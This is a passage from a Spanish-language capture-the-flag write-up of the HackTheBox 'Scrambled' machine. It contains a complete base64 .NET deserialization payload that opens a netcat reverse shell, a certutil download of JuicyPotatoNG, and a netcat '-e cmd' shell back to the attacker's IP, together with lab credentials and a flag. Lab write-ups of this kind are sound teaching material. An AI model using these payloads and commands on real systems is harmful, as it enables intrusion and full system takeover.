 Directory of C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client

05/11/2021  21:57    &lt;DIR&gt;          <span class="nb">.</span>
05/11/2021  21:57    &lt;DIR&gt;          ..
05/11/2021  21:52            86,528 ScrambleClient.exe
05/11/2021  21:52            19,456 ScrambleLib.dll
               2 File<span class="o">(</span>s<span class="o">)</span>        105,984 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  16,009,113,600 bytes free

C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a descargarlo mediante <code class="language-plaintext highlighter-rouge">smbclient.py</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient scrm.local/miscsvc:ScrambledEggs9900@dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># shares</span>
ADMIN<span class="err">$</span>
C<span class="err">$</span>
HR
IPC<span class="err">$</span>
IT
NETLOGON
Public
Sales
SYSVOL
<span class="c"># use IT</span>
<span class="c"># cd Apps\Sales Order Client</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Fri Nov  5 14:57:08 2021 <span class="nb">.</span>
drw-rw-rw-          0  Fri Nov  5 14:57:08 2021 ..
<span class="nt">-rw-rw-rw-</span>      86528  Fri Nov  5 14:57:08 2021 ScrambleClient.exe
<span class="nt">-rw-rw-rw-</span>      19456  Fri Nov  5 14:57:08 2021 ScrambleLib.dll
<span class="c"># mget *</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading ScrambleClient.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading ScrambleLib.dll
</code></pre></div></div>

<ul>
  <li>Vamos a pasarlos a una maquina <code class="language-plaintext highlighter-rouge">Windows</code> para con <code class="language-plaintext highlighter-rouge">Dnspy</code> observar el código.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/exe.png" />
</p>

<ul>
  <li>Si le damos en edit. vemos que esta corriendo en el puerto 4411.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/exe2.png" />
</p>

<ul>
  <li>Al parecer parece un software de ordenes en la empresa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos analizar el código para ver que es lo que pasa por detrás.</p>
  </li>
  <li>
    <p>Y bueno ya vemos que emplea <code class="language-plaintext highlighter-rouge">Serialize</code> básicamente serializa la data y podemos modificar el input con un ataque de deserialización con base64.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/serial.png" />
</p>

<ul>
  <li>Como dato extra si observamos en la parte del login si el usuario es scrmdev podemos entrar y al parecer aplica un Bypass vamos a entrar con ese usuario sin proporcionar contraseña.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/serial2.png" />
</p>

<ul>
  <li>Lo que vamos hacer para ganar acceso es conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> y cuando eso pase enviar una data serializada pero necesitamos general un <code class="language-plaintext highlighter-rouge">payload</code> <a href="https://github.com/pwntester/ysoserial.net/releases">https://github.com/pwntester/ysoserial.net/releases</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/yserial.png" />
</p>

<ul>
  <li>Vamos a crearlo en base64 en <code class="language-plaintext highlighter-rouge">BinaryFormatter</code> con su gadget.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/xd.png" />
</p>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora nos conectamos y con <code class="language-plaintext highlighter-rouge">upload_order</code> como vimos en el código vamos a enviar nuestra data serializada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
UPLOAD_ORDER<span class="p">;</span>AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA9AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMXdVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1WMFkyRjBMbVY0WlNBdFpTQmpiV1FnTVRBdU1UQXVNVFF1TXlBME5ETWlJRk4wWVc1a1lYSmtSWEp5YjNKRmJtTnZaR2x1WnowaWUzZzZUblZzYkgwaUlGTjBZVzVrWVhKa1QzVjBjSFYwUlc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVmMyVnlUbUZ0WlQwaUlpQlFZWE56ZDI5eVpEMGllM2c2VG5Wc2JIMGlJRVJ2YldGcGJqMGlJaUJNYjJGa1ZYTmxjbEJ5YjJacGJHVTlJa1poYkhObElpQkdhV3hsVG1GdFpUMGlZMjFrSWlBdlBnMEtJQ0FnSUNBZ1BDOXpaRHBRY205alpYTnpMbE4wWVhKMFNXNW1iejROQ2lBZ0lDQThMM05rT2xCeWIyTmxjM00rRFFvZ0lEd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlMazlpYW1WamRFbHVjM1JoYm1ObFBnMEtQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEkrQ3c9PQs<span class="o">=</span>
ERROR_GENERAL<span class="p">;</span>Error deserializing sales order: Exception has been thrown by the target of an invocation.
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Y ganamos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61761
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
5b18e5184ded3c7a33e509daf9e06b2e

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="extra">Extra</h2>

<ul>
  <li>Vamos a explotar una vía no intencionada <a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.3:80/JuicyPotatoNG.exe JuicyPotato.exe
certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.3:80/JuicyPotatoNG.exe JuicyPotato.exe
<span class="k">****</span>  Online  <span class="k">****</span>
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.

PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir
dir


    </span>Directory: C:<span class="se">\T</span>emp


Mode                LastWriteTime         Length Name                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                   
<span class="nt">-a----</span>       01/05/2024     02:43         153600 JuicyPotato.exe        
<span class="nt">-a----</span>       30/04/2024     23:43          28160 netcat.exe             



PS C:<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha y nos enviamos la reverse Shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; ./JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span> <span class="nt">-a</span> <span class="s1">'10.10.14.3 443 -e cmd'</span>
./JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span> <span class="nt">-a</span> <span class="s1">'10.10.14.3 443 -e cmd'</span>
</code></pre></div></div>

<ul>
  <li>Ganamos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61802
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\&gt;</span><span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\&gt;</span><span class="nb">hostname
hostname
</span>DC1

C:<span class="se">\&gt;</span>
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/medium/2024/04/30/scrambled.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitoregn7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
